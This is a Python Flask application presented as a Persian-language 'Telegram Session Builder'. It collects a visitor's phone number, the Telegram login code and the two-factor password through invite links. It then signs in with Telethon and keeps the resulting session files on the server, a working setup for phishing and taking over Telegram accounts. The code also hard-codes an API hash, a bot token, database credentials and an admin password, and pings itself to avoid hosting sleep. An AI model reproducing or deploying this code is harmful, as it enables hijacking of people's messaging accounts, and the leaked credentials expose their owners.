#================================================================
# Telegram Session Builder – FULL FINAL VERSION (ANTI SLEEP)
# By: Tiam
#================================================================

import os, asyncio, threading, secrets, time, shutil
from flask import Flask, request, jsonify, render_template_string, redirect
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pymongo import MongoClient
from datetime import datetime
import requests

# ===================== CONFIG ===================================
self_config = {
    "api_id": 24645053,
    "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
    "admin_username": "tiam.",
    "admin_password": "tiam_khorshid",
    "save_path": "sessions",
    "base_url": "https://anime-1127-bot-2.onrender.com",
    "fake_bot_token": "8569519729:AAG2ZLf5xn_2pNtuGDaXF_y_88SU-dqUnis"
}

os.makedirs(self_config["save_path"], exist_ok=True)

# ===================== MongoDB ==================================
mongo = MongoClient(
    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
)
db = mongo.telegram_sessions
sessions_col = db.sessions
links_col = db.links

# ===================== Flask ====================================
app = Flask(__name__, static_url_path='/static', static_folder='static')

# ===================== Async Loop ================================
loop = asyncio.new_event_loop()
threading.Thread(
    target=lambda: (asyncio.set_event_loop(loop), loop.run_forever()),
    daemon=True
).start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

# ===================== Utils ====================================
def gen_token():
    return secrets.token_urlsafe(8)

def consume_link(token):
    link = links_col.find_one({"token": token})
    if not link:
        return False
    if link["used"] + 1 >= link["max"]:
        links_col.delete_one({"token": token})
    else:
        links_col.update_one({"token": token}, {"$inc": {"used": 1}})
    return True

def normalize_phone(phone):
    phone = phone.strip()
    if phone.startswith("0"):
        return "+98" + phone[1:]
    if phone.startswith("9") and len(phone) == 10:
        return "+98" + phone
    return phone

def delete_session(phone):
    path = os.path.join(self_config["save_path"], phone)
    if os.path.exists(path):
        shutil.rmtree(path)
    sessions_col.delete_one({"phone": phone})

# ===================== HTML (USER) ===============================
HTML_PAGE = """
<!DOCTYPE html>  
<html lang="fa">  
<head>  
<meta charset="UTF-8">  
<title>Telegram Session Builder</title>  
<style>  
body { 
    background: url('/static/images/astronomy-1867616_1280.jpg') no-repeat center center fixed;
    background-size: cover;
    color: white;
    font-family: tahoma; 
}
.box { 
    width:360px;
    margin:120px auto;
    padding:25px;
    background: rgba(15, 23, 42, 0.85);
    border-radius:16px;
    text-align:center;
}
input, button, select { padding:12px;margin-top:10px;border-radius:10px;border:none; }
button { background:#6366f1;color:white;width:100%; }
select { width:80px; }
#s0 { display:flex; gap:5px; margin-bottom:10px; }
</style>  
</head>  
<body>  
<div class="box">  
<h3>ساخت سشن تلگرام</h3>  
<div id="s0">  
    <select id="country" onchange="updateCode()">  
        <option value='+98'>ایران 🇮🇷</option>  
        <option value='+90'>ترکیه 🇹🇷</option>  
        <option value='+1'>آمریکا 🇺🇸</option>  
        <option value='+44'>انگلیس 🇬🇧</option>  
    </select>
    <input id="phone" placeholder="شماره تلفن">  
</div>  
<button onclick="checkPhone()">دریافت کد</button>

<div id="exists" style="display:none">  
<p>شما قبلاً ثبت نام کرده‌اید</p>  
<button onclick="deleteSession()">حذف سشن قبلی</button>  
</div>  

<div id="s2" style="display:none">  
<input id="code" placeholder="کد تلگرام">  
<button onclick="sendCode()">تأیید کد</button>  
</div>  

<div id="s3" style="display:none">  
<input id="password" type="password" placeholder="رمز دو مرحله‌ای">  
<button onclick="sendPassword()">تأیید رمز</button>  
</div>  

<div id="done" style="display:none">  
<h3>✅ سشن ساخته شد</h3>  
</div>  
</div>  

<script>  
let phone="";  
function updateCode(){  
    let select = document.getElementById("country");  
    let p = document.getElementById("phone");  
    if(!p.value.startsWith("+")){ p.value = select.value; }  
}  
function checkPhone(){  
    phone = document.getElementById("phone").value;  
    fetch("/check_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})  
    .then(r=>r.json()).then(d=>{  
        if(d.status=="exists"){document.getElementById("exists").style.display="block"; s1.style.display="none";}  
        if(d.status=="ok"){sendPhone();}  
    });  
}  
function deleteSession(){  
    fetch("/delete_session",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})  
    .then(r=>r.json()).then(d=>{  
        if(d.status=="ok"){alert("سشن قبلی حذف شد"); document.getElementById("exists").style.display="none"; s1.style.display="block";}  
    });  
}  
function sendPhone(){  
    fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})  
    .then(r=>r.json()).then(d=>{  
        alert(d.message);  
        if(d.status=="ok"){s1.style.display="none";s2.style.display="block";}  
    });  
}  
function sendCode(){  
    fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:code.value})})  
    .then(r=>r.json()).then(d=>{  
        if(d.status=="2fa"){s2.style.display="none";s3.style.display="block";}  
        if(d.status=="ok"){finish();}  
    });  
}  
function sendPassword(){  
    fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:password.value})})  
    .then(r=>r.json()).then(d=>{if(d.status=="ok")finish();});  
}  
function finish(){  
    s1.style.display=s2.style.display=s3.style.display="none";  
    done.style.display="block";  
}  
setInterval(()=>fetch("/ping"),240000);  
</script>  
</body>  
</html>
"""

# ===================== Routes ===================================
@app.route("/")
def home():
    key = request.args.get("key")
    if not key or not consume_link(key):
        return "❌ لینک منقضی یا نامعتبر"
    return render_template_string(HTML_PAGE)

@app.route("/ping")
def ping():
    return "OK"

@app.route("/check_phone", methods=["POST"])
def check_phone():
    phone = normalize_phone(request.json["phone"])
    if sessions_col.find_one({"phone": phone}):
        return jsonify(status="exists")
    return jsonify(status="ok")

@app.route("/delete_session", methods=["POST"])
def delete_session_route():
    phone = normalize_phone(request.json["phone"])
    delete_session(phone)
    return jsonify(status="ok")

# ===================== Telethon ================================
clients = {}

async def create_client(phone):
    client = TelegramClient(
        os.path.join(self_config["save_path"], phone),
        self_config["api_id"],
        self_config["api_hash"],
        device_model="⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙",
        system_version="13",
        app_version="10.5",
        lang_code="fa",
        system_lang_code="fa"
    )
    await client.connect()
    return client

@app.route("/send_phone", methods=["POST"])
def send_phone():
    phone = normalize_phone(request.json["phone"])
    async def job():
        c = await create_client(phone)
        clients[phone] = c
        await c.send_code_request(phone)
    run_async(job())
    return jsonify(status="ok", message="کد ارسال شد")

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = normalize_phone(request.json["phone"])
    code = request.json["code"]
    c = clients.get(phone)
    try:
        async def job():
            await c.sign_in(phone, code)
            sessions_col.insert_one({"phone": phone})
        run_async(job())
        return jsonify(status="ok")
    except SessionPasswordNeededError:
        return jsonify(status="2fa")
    except PhoneCodeInvalidError:
        return jsonify(status="error")

@app.route("/send_password", methods=["POST"])
def send_password():
    phone = normalize_phone(request.json["phone"])
    pwd = request.json["password"]
    c = clients.get(phone)
    async def job():
        await c.sign_in(password=pwd)
        sessions_col.insert_one({"phone": phone})
    run_async(job())
    return jsonify(status="ok")

# ===================== Admin Panel ===============================
ADMIN_HTML = """
<!DOCTYPE html>  
<html lang="fa">  
<head>  
<meta charset="UTF-8">  
<title>Admin Panel</title>  
<style>
body {background:#020617;color:white;font-family:tahoma}
button {padding:6px 14px;border-radius:6px;margin-left:5px;}
</style>
</head>  
<body>  
<h2>پنل ادمین</h2>  
<form method="post">  
<input name="max" type="number" placeholder="تعداد استفاده" required>  
<button>ساخت لینک</button>  
</form>  
<hr>  
{% for l in links %}  
<div>
    {{ l.token }} | {{ l.used }}/{{ l.max }}
    <button onclick="copyLink('{{ base_url }}/?key={{ l.token }}')">کپی لینک</button>
</div>
{% endfor %}  
<script>
function copyLink(url) {
    navigator.clipboard.writeText(url).then(()=>{alert('لینک کپی شد: ' + url)});
}
</script>
</body>  
</html>
"""

@app.route("/admin", methods=["GET","POST"])
def admin():
    auth = request.authorization
    if not auth or auth.username!=self_config["admin_username"] or auth.password!=self_config["admin_password"]:
        return ("Unauthorized",401,{"WWW-Authenticate":"Basic"})
    if request.method=="POST":
        links_col.insert_one({
            "token": gen_token(),
            "max": int(request.form["max"]),
            "used": 0,
            "created": datetime.utcnow()
        })
        return redirect("/admin")
    return render_template_string(
        ADMIN_HTML,
        links=list(links_col.find()),
        base_url=self_config["base_url"]
    )

# ===================== KEEP ALIVE ================================
def internal_ping():
    while True:
        try: requests.get(self_config["base_url"] + "/ping", timeout=10)
        except: pass
        time.sleep(230)

def fake_bot_ping():
    while True:
        try:
            requests.get(f"https://api.telegram.org/bot{self_config['fake_bot_token']}/getMe",timeout=10)
        except: pass
        time.sleep(240)

threading.Thread(target=internal_ping, daemon=True).start()
threading.Thread(target=fake_bot_ping, daemon=True).start()

# ===================== RUN ======================================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
